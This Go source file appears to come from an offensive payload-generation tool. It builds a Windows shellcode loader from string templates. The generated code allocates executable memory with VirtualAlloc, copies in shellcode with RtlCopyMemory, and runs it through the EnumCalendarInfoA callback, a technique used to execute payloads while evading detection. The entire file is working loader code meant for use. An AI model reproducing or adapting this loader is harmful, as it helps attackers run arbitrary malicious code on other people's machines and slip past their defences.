package loaders

import (
	"fmt"
	"strings"
)

type EnumCalendarTemplate struct {
}

func (t EnumCalendarTemplate) Import() string {
	return fmt.Sprintf(`
import (
    "syscall"
    "unsafe"
)
`)
}

func (t EnumCalendarTemplate) Const() string {
	return fmt.Sprintf(`
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	EnumCalendarInfoA   = kernel32.MustFindProc("EnumCalendarInfoA")
	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")

	LOCALE_USER_DEFAULT = 0x0400
	ENUM_ALL_CALENDARS  = 0xFFFFFFFF
	CAL_SMONTHNAME1     = 0x00000015
)
`)
}

func (t EnumCalendarTemplate) Init() string {
	return ""
}

func (t EnumCalendarTemplate) Process() string {
	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	_, _, _ = EnumCalendarInfoA.Call(
		addr,
		(uintptr)(LOCALE_USER_DEFAULT),
		(uintptr)(ENUM_ALL_CALENDARS),
		(uintptr)(CAL_SMONTHNAME1),
	)
`)
}

func (t EnumCalendarTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__
	
}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
